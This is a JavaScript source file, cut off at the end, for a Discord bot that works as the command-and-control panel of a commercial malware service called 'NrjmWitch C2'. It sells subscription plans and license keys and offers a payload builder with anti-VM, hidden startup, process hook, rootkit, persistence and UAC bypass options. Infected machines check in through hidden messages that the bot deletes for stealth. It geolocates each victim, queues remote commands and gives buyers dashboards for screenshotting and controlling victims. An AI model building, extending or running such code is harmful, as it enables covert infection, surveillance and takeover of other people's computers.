require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const setupDatabase = require('./database.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
    ],
    partials: [Partials.Channel]
});

let db;

// Build configuration state (userId -> {antivm, crypt, startup, hook, socket, rootkit, persistence, uac})
const buildConfigs = new Map();

// Debug: Instance Metadata
const BOT_VERSION = '1.0.4 - Absolute Path & SQL Dedupe';
const INSTANCE_ID = crypto.randomBytes(4).toString('hex');

async function startBot() {
    db = await setupDatabase();

    client.on('ready', () => {
        console.log(`========================================`);
        console.log(`Bot is online!`);
        console.log(`Tag: ${client.user.tag}`);
        console.log(`Version: ${BOT_VERSION}`);
        console.log(`Instance ID: ${INSTANCE_ID}`);
        console.log(`========================================`);
    });

    // Helper to parse duration string (e.g., '30d', '1y', 'lifetime')
    function parseDuration(durationStr) {
        if (!durationStr) return null;
        const lower = durationStr.toLowerCase();
        if (['lifetime', 'permanent', 'inf'].includes(lower)) return null;

        const match = lower.match(/^(\d+)([dmy])$/);
        if (!match) return undefined; // Invalid format

        const value = parseInt(match[1]);
        const unit = match[2];
        const date = new Date();

        if (unit === 'd') date.setDate(date.getDate() + value);
        else if (unit === 'm') date.setMonth(date.getMonth() + value);
        else if (unit === 'y') date.setFullYear(date.getFullYear() + value);

        return date.toISOString();
    }

    // --- Welcome Message Payload Helper ---
    function getWelcomePayload() {
        const embed = new EmbedBuilder()
            .setColor('#2b2d31') // Modern Dark Theme
            .setTitle('<:crown:1234567890> Welcome to NrjmWitch Elite')
            .setDescription(
                "### <:sparkles:1234567890> Thank you for your purchase!\n\n" +
                "You have successfully linked your account to **NrjmWitch C2**.\n" +
                "Unlock the full potential of your management experience with our premium tools.\n\n" +
                "**<:rocket:1234567890> Next Steps**\n" +
                "> 1. Use `!help` to see all available commands.\n" +
                "> 2. Use `!generatekey` to create your first license key.\n" +
                "> 3. Check `!me` to view your subscription status.\n\n" +
                "**<:shield:1234567890> Stay Connected**\n" +
                "> Join our support server for updates and assistance."
            )
            .addFields(
                {
                    name: '📚 Documentation',
                    value: `[View Guide Channel](https://discord.com/channels/1463245840821911736/1471942948764778637)`,
                    inline: true
                },
                {
                    name: '🛡️ Support Server',
                    value: `[Join Server](https://discord.gg/b6vwuTYtn3)`,
                    inline: true
                }
            )
            .setImage('https://media.discordapp.net/attachments/123456789/123456789/banner.png') // User to replace
            .setFooter({ text: 'NrjmWitch C2 • Empower Your Control', iconURL: client.user.displayAvatarURL() })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('Join Community')
                    .setStyle(ButtonStyle.Link)
                    .setURL('https://discord.gg/b6vwuTYtn3')
                    .setEmoji('🛡️'),
                new ButtonBuilder()
                    .setLabel('View Tutorials')
                    .setStyle(ButtonStyle.Link)
                    .setURL('https://discord.com/channels/1463245840821911736/1471942948764778637')
                    .setEmoji('📚')
            );

        return { embeds: [embed], components: [row] };
    }

    // --- EVENT: Bot Joins a Server (LOG ONLY - NO SPAM) ---
    client.on('guildCreate', async guild => {
        console.log(`Joined new guild: ${guild.name} (ID: ${guild.id})`);
        // Disabled auto-welcome to server channels as per request
    });

    const processedMessages = new Set();

    client.on('messageCreate', async message => {
        // Ignore bots and webhooks (Exception for C2 Check-in)
        const isC2Command = message.content.trim().startsWith('!checkin');
        if ((message.author.bot || message.webhookId) && !isC2Command) return;

        // Persistent Message Deduplication (SQL-based fallback)
        try {
            const alreadyProcessed = await db.get('SELECT 1 FROM processed_messages WHERE message_id = ?', message.id);
            if (alreadyProcessed) return;
            await db.run('INSERT INTO processed_messages (message_id, processed_at) VALUES (?, ?)', [message.id, new Date().toISOString()]);
        } catch (e) { console.error('Deduplication Error:', e); }

        // Local Memory Deduplication (Faster)
        if (processedMessages.has(message.id)) return;
        processedMessages.add(message.id);
        setTimeout(() => processedMessages.delete(message.id), 10000); // 10s TTL

        // Command parsing (trim + split)
        const args = message.content.trim().split(/ +/);
        const command = args.shift().toLowerCase();

        // -------------------------------------
        // PUBLIC COMMANDS (Non-locked)
        // -------------------------------------
        // Example: if (command === '!victims') { /* ... (victims logic) ... */ }


        // -------------------------------------
        // SENSITIVE COMMANDS (DM Only)
        // -------------------------------------
        if (command !== '!checkin' && message.channel.type !== 1) return; // Ignore non-DM unless checkin

        if (command === '!help') {
            const helpEmbed = new EmbedBuilder()
                .setColor('#5865F2')
                .setTitle('🛠️ NrjmWitch C2 - Command Center')
                .setDescription(
                    "Welcome to the **NrjmWitch** assistance interface.\n" +
                    "Below you will find everything you need to manage your operation effectively."
                )
                .addFields(
                    {
                        name: '🔐 Authentication',
                        value:
                            "> **`!login <username> <password>`**\n" +
                            "> Securely log in to your account. Binds to your Discord ID on first use.\n" +
                            "> *Example:* `!login MyUser 123456`"
                    },
                    {
                        name: '🔑 Key Management',
                        value:
                            "> **`!generatekey`**\n" +
                            "> Generates a new unique license key based on your plan limits.\n" +
                            "> *Use this to grant access to your clients.*"
                    },
                    {
                        name: '📊 Dashboard & Insights',
                        value:
                            "> **`!me`**\n" +
                            "> View your profile, subscription expiry, key usage, and stats.\n" +
                            "> **`!victims`**\n" +
                            "> View a live list of your connected victims with status indicators."
                    },
                    {
                        name: '⚙️ Admin Tools (Owner Only)',
                        value:
                            "> **`!register`**, **`!admin`**, **`!announce_all`**\n" +
                            "> *Restricted access for bot management.*"
                    }
                )
                .addFields({ name: '\u200B', value: '__**Quick Links**__' })
                .addFields(
                    { name: '🆘 Support', value: '[Join Server](https://discord.gg/b6vwuTYtn3)', inline: true },
                    { name: '📖 Guides', value: '[Read Docs](https://discord.com/channels/1463245840821911736/1471942948764778637)', inline: true }
                )
                .setImage('https://media.discordapp.net/attachments/123456789/123456789/banner.png')
                .setFooter({ text: `NrjmWitch C2 • v${BOT_VERSION} [${INSTANCE_ID}]`, iconURL: client.user.displayAvatarURL() });

            const helpRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setLabel('Get Support').setStyle(ButtonStyle.Link)
                    .setURL('https://discord.gg/b6vwuTYtn3').setEmoji('🤝'),
                new ButtonBuilder().setLabel('Tutorials').setStyle(ButtonStyle.Link)
                    .setURL('https://discord.com/channels/1463245840821911736/1471942948764778637').setEmoji('📖')
            );

            return message.reply({ embeds: [helpEmbed], components: [helpRow] });
        }

        console.log(`Received command: ${command} from ${message.author.tag}`);
        // Owner only check for non-public commands
        const isOwner = message.author.id === '1190367283431604314'; // Your ID

        // -------------------------------------
        // BROADCAST COMMAND (Owner Only - DMs Only)
        // -------------------------------------
        if (command === '!announce_all') {
            const OWNER_ID = '1454132213011579155';
            if (message.author.id !== OWNER_ID) return;

            message.reply('📣 **Starting DM Broadcast to Registered Users...**');
            const payload = getWelcomePayload();
            let successCount = 0;
            let failCount = 0;

            // Send to all Registered Users (DM)
            try {
                const users = await db.all('SELECT discord_id FROM users WHERE discord_id IS NOT NULL');
                for (const u of users) {
                    try {
                        const user = await client.users.fetch(u.discord_id);
                        if (user) {
                            await user.send(payload);
                            successCount++;
                        }
                    } catch (e) {
                        console.error(`Failed to DM user ${u.discord_id}: ${e.message}`);
                        failCount++;
                    }
                }
            } catch (dbError) {
                console.error("Database error fetching users for broadcast:", dbError);
                message.reply("❌ Database error during user fetch.");
            }

            message.reply(`✅ **DM Broadcast Complete!**\nSent: \`${successCount}\`\nFailed: \`${failCount}\``);
        }

        // -------------------------------------
        // Register Command (Admin Only)
        // -------------------------------------
        if (command === '!register') {
            const OWNER_ID = '1454132213011579155';
            if (message.author.id !== OWNER_ID) {
                return message.reply('❌ You are not authorized to use this command.');
            }

            if (args.length < 4) {
                return message.reply('Usage: `!register <username> <password> <plan> <duration>`\nDuration examples: `30d`, `1m`, `1y`, `lifetime`');
            }
            const [username, password, plan, durationStr] = args;
            const validPlans = ['basic', 'gold', 'diamond', 'professional'];
            if (!validPlans.includes(plan.toLowerCase())) {
                return message.reply('Invalid plan name. Use `basic`, `gold`, `diamond`, or `professional`.');
            }

            const expiryDate = parseDuration(durationStr);
            if (expiryDate === undefined) {
                return message.reply('Invalid duration format. Use `30d` (Days), `1m` (Months), `1y` (Years), or `lifetime`.');
            }

            try {
                const hashedPassword = await bcrypt.hash(password, 10);
                await db.run(
                    'INSERT INTO users (username, password, plan, plan_expiry) VALUES (?, ?, ?, ?)',
                    [username, hashedPassword, plan.toLowerCase(), expiryDate]
                );

                const expiryText = expiryDate ? new Date(expiryDate).toLocaleDateString() : 'Lifetime';

                const embed = new EmbedBuilder()
                    .setColor('#00ff00')
                    .setTitle('✅ User Registered Successfully')
                    .setDescription(`User **${username}** has been created.`)
                    .addFields(
                        { name: 'Plan', value: plan.toUpperCase(), inline: true },
                        { name: 'Expires', value: expiryText, inline: true }
                    )
                    .setFooter({ text: 'Account is currently unbound. It will bind on first login.' });

                message.reply({ embeds: [embed] });

            } catch (error) {
                if (error.code === 'SQLITE_CONSTRAINT') {
                    message.reply('This username is already registered.');
                } else {
                    console.error(error);
                    message.reply('An error occurred during registration.');
                }
            }
        }
        // -------------------------------------
        // Login Command
        // -------------------------------------
        else if (command === '!login') {
            if (args.length < 2) {
                return message.reply('Usage: `!login <username> <password>`');
            }
            const [username, password] = args;

            try {
                const user = await db.get('SELECT * FROM users WHERE username = ?', username);
                if (!user) {
                    return message.reply('Invalid username or password.');
                }

                const isPasswordValid = await bcrypt.compare(password, user.password);
                if (!isPasswordValid) {
                    return message.reply('Invalid username or password.');
                }

                // --- CHECK EXPIRY ---
                if (user.plan_expiry) {
                    const expiryDate = new Date(user.plan_expiry);
                    if (expiryDate < new Date()) {
                        return message.reply('❌ **Subscription Expired**\nYour plan has expired. Please contact the administrator to renew.');
                    }
                }

                const OWNER_ID = '1454132213011579155';
                let firstTimeBind = false;

                if (user.discord_id === null) {
                    if (message.author.id !== OWNER_ID) {
                        const existingUser = await db.get('SELECT * FROM users WHERE discord_id = ?', message.author.id);
                        if (existingUser) {
                            return message.reply('❌ **Access Denied.**\nYou already have an account bound to this Discord ID. Multi-accounting is not allowed.');
                        }
                    }
                    await db.run('UPDATE users SET discord_id = ? WHERE id = ?', [message.author.id, user.id]);
                    firstTimeBind = true;
                } else if (user.discord_id !== message.author.id) {
                    return message.reply(`❌ **Access Denied.**\nThis account is permanently bound to another Discord user.`);
                }

                await db.run('UPDATE users SET is_logged_in = 1 WHERE id = ?', user.id);

                const expiryText = user.plan_expiry ? `<t:${Math.floor(new Date(user.plan_expiry).getTime() / 1000)}:R>` : 'Lifetime';

                const welcomeEmbed = new EmbedBuilder()
                    .setColor('#00ff00')
                    .setTitle(`✅ Welcome Back, ${user.username}!`)
                    .setDescription('You have successfully logged in to **NrjmWitch C2**.')
                    .setThumbnail(message.author.displayAvatarURL())
                    .addFields(
                        { name: 'Subscription Plan', value: `\`${user.plan.toUpperCase()}\``, inline: true },
                        { name: 'Expires', value: expiryText, inline: true },
                        { name: 'Status', value: '`Active`', inline: true }
                    )
                    .setFooter({ text: 'Use !generatekey to start operations.' })
                    .setTimestamp();

                message.reply({ embeds: [welcomeEmbed] });

                // Send Welcome DM if first time binding
                if (firstTimeBind) {
                    try {
                        const dmPayload = getWelcomePayload();
                        await message.author.send(dmPayload);
                    } catch (err) {
                        console.error("Could not send welcome DM:", err);
                        // Be silent about DM failure in public chat to avoid clutter
                    }
                }

            } catch (error) {
                console.error('Login error:', error);
                message.reply('An error occurred during login.');
            }
        }
        // -------------------------------------
        // Generate Key Command
        // -------------------------------------
        else if (command === '!generatekey') {
            try {
                const user = await db.get('SELECT * FROM users WHERE discord_id = ? AND is_logged_in = 1', message.author.id);
                if (!user) {
                    return message.reply('❌ **Access Denied**\nYou are not logged in. Please use `!login <user> <pass>` first.');
                }

                if (user.plan_expiry && new Date(user.plan_expiry) < new Date()) {
                    return message.reply('❌ **Subscription Expired**\nPlease renew your plan.');
                }

                const planLimits = {
                    basic: 1,
                    gold: 3,
                    diamond: 15,
                    professional: Infinity
                };

                const userPlan = user.plan.toLowerCase();
                const userLimit = planLimits[userPlan] || 0;

                if (userLimit !== Infinity) {
                    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
                    const result = await db.get('SELECT COUNT(*) as count FROM key_usage WHERE user_id = ? AND generated_at >= ?', [user.id, twentyFourHoursAgo]);

                    if (result.count >= userLimit) {
                        const oldestKey = await db.get('SELECT generated_at FROM key_usage WHERE user_id = ? AND generated_at >= ? ORDER BY generated_at ASC LIMIT 1', [user.id, twentyFourHoursAgo]);
                        let nextTime = Date.now() + (24 * 60 * 60 * 1000);
                        if (oldestKey) nextTime = new Date(oldestKey.generated_at).getTime() + (24 * 60 * 60 * 1000);

                        return message.reply({ embeds: [new EmbedBuilder().setColor('#ff0000').setTitle('🚫 Daily Limit Reached').setDescription(`You have reached the **${userLimit}** key limit for your **${userPlan}** plan.`).addFields({ name: 'Next Key Available', value: `<t:${Math.floor(nextTime / 1000)}:R>` })] });
                    }
                }

                const key = crypto.randomBytes(16).toString('hex'); // 32 chars
                // Save the key string to DB
                await db.run('INSERT INTO key_usage (user_id, key_string, generated_at) VALUES (?, ?, ?)', [user.id, key, new Date().toISOString()]);

                const successEmbed = new EmbedBuilder()
                    .setColor('#00ff00')
                    .setTitle('🔑 Key Generated Successfully')
                    .addFields({ name: 'Key', value: `\`${key}\`` }, { name: 'Plan', value: userPlan.toUpperCase(), inline: true })
                    .setFooter({ text: 'Use this key in your payload.' }).setTimestamp();
                message.reply({ embeds: [successEmbed] });

            } catch (error) {
                console.error('Generate key error:', error);
                message.reply('An error occurred.');
            }
        }
        // -------------------------------------
        // Build Payload Command (!buildpayload) - Interactive
        // -------------------------------------
        else if (command === '!buildpayload') {
            if (message.channel.type !== ChannelType.DM) {
                return message.reply('⚠️ This command only works in DMs for security.');
            }

            try {
                const user = await db.get('SELECT * FROM users WHERE discord_id = ?', message.author.id);
                if (!user) {
                    return message.reply('❌ You must register first. Use `!register <username> <password>`');
                }

                // Get user's latest key
                const latestKey = await db.get('SELECT key_string FROM key_usage WHERE user_id = ? ORDER BY generated_at DESC LIMIT 1', user.id);

                if (!latestKey) {
                    return message.reply('❌ No license key found. Generate one first using `!generatekey`');
                }

                // Initialize empty configuration
                const configEmbed = new EmbedBuilder()
                    .setColor('#7289da')
                    .setTitle('�️ Payload Configuration Builder')
                    .setDescription('**Select features for your payload**\nClick buttons below to toggle options. Green = Enabled')
                    .addFields(
                        { name: '🔑 License Key', value: `\`${latestKey.key_string.substring(0, 16)}...\``, inline: false },
                        { name: '📦 Selected Features', value: '`None selected`', inline: false },
                        { name: '💎 Your Plan', value: `\`${user.plan.toUpperCase()}\``, inline: true },
                        { name: '⚡ Status', value: 'Ready to configure', inline: true }
                    )
                    .setFooter({ text: `NrjmWitch C2 • v${BOT_VERSION} [${INSTANCE_ID}] • Build when ready` })
                    .setTimestamp();

                const userPlan = user.plan.toLowerCase();
                const hasRootkit = ['diamond', 'professional'].includes(userPlan);

                // Feature buttons row 1
                const row1 = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_antivm_${message.author.id}`)
                            .setLabel('🛡️ Anti-VM')
                            .setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_crypt_${message.author.id}`)
                            .setLabel('🔒 Encryption')
                            .setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_startup_${message.author.id}`)
                            .setLabel('👻 Hidden Startup')
                            .setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_hook_${message.author.id}`)
                            .setLabel('🎭 Process Hook')
                            .setStyle(ButtonStyle.Secondary)
                    );

                // Feature buttons row 2
                const row2 = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_socket_${message.author.id}`)
                            .setLabel('📡 Hidden Socket')
                            .setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_rootkit_${message.author.id}`)
                            .setLabel('💀 RootKit')
                            .setStyle(hasRootkit ? ButtonStyle.Secondary : ButtonStyle.Danger)
                            .setDisabled(!hasRootkit),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_persistence_${message.author.id}`)
                            .setLabel('🔄 Persistence')
                            .setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder()
                            .setCustomId(`build_toggle_uac_${message.author.id}`)
                            .setLabel('🔓 UAC Bypass')
                            .setStyle(ButtonStyle.Secondary)
                    );

                // Action buttons
                const row3 = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`build_confirm_${message.author.id}`)
                            .setLabel('✅ Build Payload')
                            .setStyle(ButtonStyle.Success),
                        new ButtonBuilder()
                            .setCustomId(`build_cancel_${message.author.id}`)
                            .setLabel('❌ Cancel')
                            .setStyle(ButtonStyle.Danger)
                    );

                await message.reply({ embeds: [configEmbed], components: [row1, row2, row3] });

            } catch (error) {
                console.error('Build payload error:', error);
                message.reply('❌ An error occurred while starting the builder.');
            }
        }
        // -------------------------------------
        // C2 Check-in Command (!checkin) - Hidden
        // Syntax: !checkin <KEY> <HWID> <IP> <PC_NAME> <OS>
        // -------------------------------------
        else if (command === '!checkin') {
            // Delete the message immediately for stealth (if possible)
            try { await message.delete(); } catch (e) { }

            if (args.length < 5) return; // Silent fail if invalid format

            const [key, hwid, ip, pcName, ...osParts] = args;
            const osName = osParts.join(' ');

            try {
                // 1. Validate Key
                const keyRecord = await db.get('SELECT * FROM key_usage WHERE key_string = ?', key);
                if (!keyRecord) {
                    console.log(`[C2] Failed checkin: Invalid Key (${key}) from ${ip}`);
                    return;
                }

                // 2. Get user info
                const user = await db.get('SELECT * FROM users WHERE id = ?', keyRecord.user_id);
                if (!user || !user.discord_id) return;

                // 3. Check if this is a new victim
                const existingVictim = await db.get('SELECT * FROM victims WHERE user_id = ? AND hardware_id = ?', [keyRecord.user_id, hwid]);
                const isNewVictim = !existingVictim;

                // --- GEO-IP LOOKUP ---
                let country = 'Unknown';
                let countryCode = 'QM'; // Question Mark
                let isp = 'Unknown';
                let timezone = 'Unknown';

                try {
                    // Fetch Geo Info
                    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,isp,timezone`);
                    const geoData = await geoRes.json();

                    if (geoData.status === 'success') {
                        country = geoData.country;
                        countryCode = geoData.countryCode.toLowerCase();
                        isp = geoData.isp;
                        timezone = geoData.timezone;
                    }
                } catch (geoErr) {
                    console.error('[C2] Geo-IP Error:', geoErr.message);
                }

                // 4. Add/Update Victim
                await db.run(`
                    INSERT INTO victims (user_id, hardware_id, ip_address, os_info, computer_name, last_seen, status)
                    VALUES (?, ?, ?, ?, ?, ?, 'online')
                    ON CONFLICT(user_id, hardware_id) DO UPDATE SET
                        ip_address = excluded.ip_address,
                        os_info = excluded.os_info,
                        computer_name = excluded.computer_name,
                        last_seen = excluded.last_seen,
                        status = 'online'
                `, [keyRecord.user_id, hwid, ip, osName, pcName, new Date().toISOString()]);

                console.log(`[C2] ${isNewVictim ? 'New' : 'Reconnect'} Checkin: ${pcName} (${ip}) linked to User ID ${keyRecord.user_id}`);

                // 5. Check for pending commands
                const pendingCommands = await db.all('SELECT * FROM command_queue WHERE victim_hwid = ? AND status = ?', [hwid, 'pending']);

                if (pendingCommands.length > 0) {
                    const commandsText = pendingCommands.map(cmd => `${cmd.id}:${cmd.command_type}:${cmd.command_data || ''}`).join('|');
                    for (const cmd of pendingCommands) {
                        await db.run('UPDATE command_queue SET status = ? WHERE id = ?', ['sent', cmd.id]);
                    }
                    await message.channel.send(`!cmd ${hwid} ${commandsText}`);
                    console.log(`[C2] Sent ${pendingCommands.length} commands to ${pcName}`);
                }

                // 6. Send DM notification to user if new victim
                if (isNewVictim) {
                    try {
                        const discordUser = await client.users.fetch(user.discord_id);
                        const flagEmoji = countryCode === 'qm' ? '🏳️' : `:flag_${countryCode}:`;

                        const victimEmbed = new EmbedBuilder()
                            .setColor('#00ff00')
                            .setTitle('🚨 New Victim Connected!')
                            .setDescription(`**A new machine has been infected and linked to your C2.**`)
                            .setThumbnail('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbm9oOXB6eXl6eXl6eXl6eXl6eXl6eXl6eXl6eXl6eXl6eSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/KeepSimple/giphy.gif')
                            .addFields(
                                { name: '💻 Computer Name', value: `\`${pcName}\``, inline: true },
                                { name: '🖥️ OS Version', value: `\`${osName}\``, inline: true },
                                { name: '🔑 HWID', value: `\`${hwid.substring(0, 8)}...\``, inline: true },
                                { name: '\u200B', value: '\u200B', inline: false },
                                { name: `${flagEmoji} Location`, value: `**${country}**`, inline: true },
                                { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                                { name: '📡 ISP', value: `\`${isp}\``, inline: true },
                                { name: '🕒 Timezone', value: `\`${timezone}\``, inline: true }
                            )
                            .setFooter({ text: 'NrjmWitch C2 • victim secured', iconURL: client.user.displayAvatarURL() })
                            .setTimestamp();

                        const controlRow = new ActionRowBuilder()
                            .addComponents(
                                new ButtonBuilder()
                                    .setCustomId(`c2_sysinfo_${hwid}`)
                                    .setLabel('View System Info')
                                    .setStyle(ButtonStyle.Primary),
                                new ButtonBuilder()
                                    .setCustomId(`c2_screenshot_${hwid}`)
                                    .setLabel('📸 Screenshot')
                                    .setStyle(ButtonStyle.Secondary)
                            );

                        await discordUser.send({ embeds: [victimEmbed], components: [controlRow] });
                        console.log(`[C2] Sent DM notification to user ${user.discord_id}`);
                    } catch (dmError) {
                        console.error(`[C2] Failed to send DM: ${dmError.message}`);
                    }
                }

            } catch (error) {
                console.error('[C2] Checkin Error:', error);
            }
        }
        // -------------------------------------
        // Profile Command (!me) - REDESIGNED
        // -------------------------------------
        else if (command === '!me') {
            const user = await db.get('SELECT * FROM users WHERE discord_id = ? AND is_logged_in = 1', message.author.id);
            if (!user) return message.reply('You are not logged in.');

            const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
            const keysUsed = (await db.get('SELECT COUNT(*) as c FROM key_usage WHERE user_id = ? AND generated_at >= ?', [user.id, twentyFourHoursAgo])).c;
            const activeVictims = (await db.get('SELECT COUNT(*) as c FROM victims WHERE user_id = ? AND status = "online"', [user.id])).c;
            const totalVictims = (await db.get('SELECT COUNT(*) as c FROM victims WHERE user_id = ?', [user.id])).c;

            const planLimits = { basic: 1, gold: 3, diamond: 15, professional: Infinity };
            const limit = planLimits[user.plan.toLowerCase()] || 0;
            const limitStr = limit === Infinity ? 'Unlimited' : limit;

            // Progress Bar Logic
            const percent = limit === Infinity ? 0 : Math.min(100, Math.floor((keysUsed / limit) * 100));
            const filled = Math.floor(percent / 10);
            const empty = 10 - filled;
            // Handle edge case where percent is 0 but limit is Infinity (show full empty)
            // If limit is infinity, we can't show progress, so show custom bar or just hide it
            const progressBar = limit === Infinity ? '`[⚡ UNLIMITED POWER ⚡]`' : '`[' + '█'.repeat(filled) + '░'.repeat(empty) + ']`';

            const expiryText = user.plan_expiry ? `<t:${Math.floor(new Date(user.plan_expiry).getTime() / 1000)}:R>` : 'Lifetime';

            const profileEmbed = new EmbedBuilder()
                .setColor('#2b2d31') // Dark theme
                .setTitle(`👤 Agent Profile`)
                .setDescription(`**User:** ${user.username}\n**Status:** ✅ Active`)
                .setThumbnail(message.author.displayAvatarURL())
                .addFields(
                    { name: '💎 Current Plan', value: `\`${user.plan.toUpperCase()}\``, inline: true },
                    { name: '⏳ Subscription Expires', value: expiryText, inline: true },
                    { name: '\u200B', value: '\u200B', inline: false }, // Spacer
                    { name: '🔑 Key Usage (24h)', value: `${progressBar} **${keysUsed}/${limitStr}**`, inline: false },
                    { name: '💀 Victim Statistics', value: `> **Online:** \`${activeVictims}\`\n> **Total:** \`${totalVictims}\``, inline: true }
                )
                .setFooter({ text: 'NrjmWitch C2 • Managed by Owner' })
                .setTimestamp();

            message.reply({ embeds: [profileEmbed] });
        }
        // -------------------------------------
        // Victims Command (!victims) - Professional Dashboard
        // -------------------------------------
        else if (command === '!victims') {
            try {
                const user = await db.get('SELECT * FROM users WHERE discord_id = ? AND is_logged_in = 1', message.author.id);
                if (!user) return message.reply('❌ You are not logged in.');

                const victims = await db.all('SELECT * FROM victims WHERE user_id = ? ORDER BY last_seen DESC', user.id);
                const onlineCount = victims.filter(v => v.status === 'online').length;
                const offlineCount = victims.length - onlineCount;

                // Calculate new connections in last 24h
                const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
                const recentVictims = victims.filter(v => new Date(v.last_seen) > twentyFourHoursAgo);

                const dashboardEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle('🎯 VICTIM MANAGEMENT DASHBOARD')
                    .setDescription('**Real-time monitoring of all connected machines**')
                    .addFields(
                        { name: '\u200b', value: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
                        { name: '📊 Statistics', value: `\`\`\`yaml\nTotal Victims: ${victims.length}\nOnline: ${onlineCount} 🟢\nOffline: ${offlineCount} ⚫\nLast 24h: ${recentVictims.length} new\`\`\``, inline: false },
                        { name: '\u200b', value: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', inline: false }
                    );

                if (victims.length === 0) {
                    dashboardEmbed.addFields({
                        name: '📭 No Victims Yet',
                        value: '```\nNo machines connected yet.\nUse !buildpayload to create your first payload.\n```',
                        inline: false
                    });
                } else {
                    // Show up to 10 victims
                    const displayVictims = victims.slice(0, 10);

                    dashboardEmbed.addFields({ name: '🖥️ ACTIVE VICTIMS', value: '\u200b', inline: false });

                    displayVictims.forEach((v, index) => {
                        const statusIcon = v.status === 'online' ? '🟢' : '⚫';
                        const lastSeen = new Date(v.last_seen);
                        const timeDiff = Date.now() - lastSeen.getTime();
                        const minutesAgo = Math.floor(timeDiff / 60000);
                        const timeStr = minutesAgo < 1 ? 'Just now' :
                            minutesAgo < 60 ? `${minutesAgo}m ago` :
                                minutesAgo < 1440 ? `${Math.floor(minutesAgo / 60)}h ago` :
                                    `${Math.floor(minutesAgo / 1440)}d ago`;

                        dashboardEmbed.addFields({
                            name: `${index + 1}️⃣ ${v.computer_name}`,
                            value: `\`\`\`yaml\n🌐 IP: ${v.ip_address}\n🖥️ OS: ${v.os_info}\n⏰ Last seen: ${timeStr}\n📊 Status: ${statusIcon} ${v.status}\`\`\``,
                            inline: false
                        });
                    });

                    if (victims.length > 10) {
                        dashboardEmbed.addFields({
                            name: '\u200b',
                            value: `*...and ${victims.length - 10} more victims*`,
                            inline: false
                        });
                    }

                    dashboardEmbed.addFields(
                        { name: '\u200b', value: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
                        {
                            name: '💡 Control a Victim',
                            value: '```\nUse: !control <IP>\nExample: !control ' + (victims[0]?.ip_address || '192.168.1.100') + '\n```',
                            inline: false
                        }
                    );
                }

                dashboardEmbed.setFooter({ text: `${user.username} • ${user.plan.toUpperCase()} Plan`, iconURL: message.author.displayAvatarURL() });
                dashboardEmbed.setTimestamp();

                message.reply({ embeds: [dashboardEmbed] });

            } catch (error) {
                console.error('Victims command error:', error);
                message.reply('❌ An error occurred.');
            }
        }
        // -------------------------------------
        // Control Victim Command (!control <IP>)
        // -------------------------------------
        else if (command === '!control') {
            try {
                const user = await db.get('SELECT * FROM users WHERE discord_id = ? AND is_logged_in = 1', message.author.id);
                if (!user) return message.reply('❌ You are not logged in.');

                const targetIP = args[0];
                if (!targetIP) {
                    return message.reply('❌ **Usage:** `!control <IP>`\n**Example:** `!control 192.168.1.100`');
                }

                // Find victim by IP
                const victim = await db.get('SELECT * FROM victims WHERE user_id = ? AND ip_address = ?', [user.id, targetIP]);

                if (!victim) {
                    return message.reply(`❌ **Victim not found**\nNo victim with IP \`${targetIP}\` found in your list.\nUse \`!victims\` to see all connected machines.`);
                }

                // Create control panel
                const controlEmbed = new EmbedBuilder()
                    .setColor(victim.status === 'online' ? '#00ff00' : '#ff0000')
                    .setTitle(`🎯 Victim Selected: ${victim.computer_name}`)
                    .setDescription('**Control panel activated for this machine**')
                    .addFields(
                        { name: '💻 Computer Name', value: `\`${victim.computer_name}\``, inline: true },
                        { name: '🌐 IP Address', value: `\`${victim.ip_address}\``, inline: true },
                        { name: '🖥️ Operating System', value: `\`${victim.os_info}\``, inline: true },
                        { name: '🔑 Hardware ID', value: `\`${victim.hardware_id.substring(0, 24)}...\``, inline: false },
                        { name: '⏰ Last Check-in', value: `<t:${Math.floor(new Date(victim.last_seen).getTime() / 1000)}:R>`, inline: true },
                        { name: '📊 Status', value: victim.status === 'online' ? '🟢 **Online**' : '⚫ **Offline**', inline: true }
                    )
                    .setFooter({ text: 'Use buttons below to execute commands', iconURL: client.user.displayAvatarURL() })
                    .setTimestamp();

                // Control buttons
                const row1 = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`c2_screenshot_${victim.hardware_id}`)
                            .setLabel('📸 Screenshot')
                            .setStyle(ButtonStyle.Primary),
                        new ButtonBuilder()
                            .setCustomId(`c2_sysinfo_${victim.hardware_id}`)
                            .setLabel('💻 System Info')
                            .setStyle(ButtonStyle.Primary),
                        new ButtonBuilder()
